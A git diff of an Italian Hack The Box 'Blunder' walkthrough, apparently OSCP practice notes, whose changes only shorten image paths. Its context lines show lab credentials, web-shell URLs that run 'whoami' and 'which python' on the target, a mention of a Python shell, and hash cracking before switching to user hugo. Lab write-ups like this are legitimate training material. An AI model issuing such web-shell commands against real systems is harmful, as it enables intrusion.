@@ -30,7 +30,7 @@ la porta 21 me la segnala come chiusa ma non so perche me la mostra
 
 Visitiamo il sito 
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder.png)
+![](../zzz_rev/attachments/blunder.png)
 Ci troviamo difronte a quello che sembra essere un blog. Scorrendo fino in fondo vediamo la scritta Powered byEgotisticalSW 
 
 Cercando su google non troviamo nella di utile.
@@ -83,7 +83,7 @@ ________________________________________________
 ```
 
 la pagine admin sembra interessante la visitiamo e ci troviamo siamo davanti ad un prompt di login
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Blunder1.png)
+![](../zzz_rev/attachments/Blunder1.png)
 Ho provato alcune credenziali di default ma niente, anche delle SQL-INJECTION non hanno alcun effetto.
 
 La pagina /install.php ci dice che bludit è stato installato 
@@ -258,7 +258,7 @@ Use fergus:RolandDeschain to login.
 
 Utilizziamo le credenziali trovate per accedere al sito 
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder2.png)
+![](../zzz_rev/attachments/blunder2.png)
 
 
 # GAINING AN INITIAL FOOTHOLD
@@ -351,7 +351,7 @@ bf4d7bdd3837f910be1753a72ecfb697f0b6241e
 -----------------------------24519939964357608924145519178--
 
 ```
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder3.png)
+![](../zzz_rev/attachments/blunder3.png)
 non ci resta che visitare http://10.10.10.191/bl-content/tmp/wolf.png?0=whoami per vedere che siamo utenti www-data, dandoci conferma che la RCE funziona.
 
 Ok abbiamo la nostra RCE funzionante è il momento di avere la nostra shell.
@@ -359,7 +359,7 @@ Vediamo se è installato python:
 `http://10.10.10.191/bl-content/tmp/wolf.png?0=which+python`
 il server ci restituisce `/user/bin/python`  perfetto
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder4.png)
+![](../zzz_rev/attachments/blunder4.png)
 
 Utilizziamo questa shell python 
 ```python 
@@ -718,7 +718,7 @@ Stopped: Thu Oct 26 06:30:01 2023
 
 anche [Crackstation](https://crackstation.net) è stato in grado di forzare l'hash
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder5.png)
+![](../zzz_rev/attachments/blunder5.png)
 
 loggiamoci come utente hugo con il comando `su hugo`
 
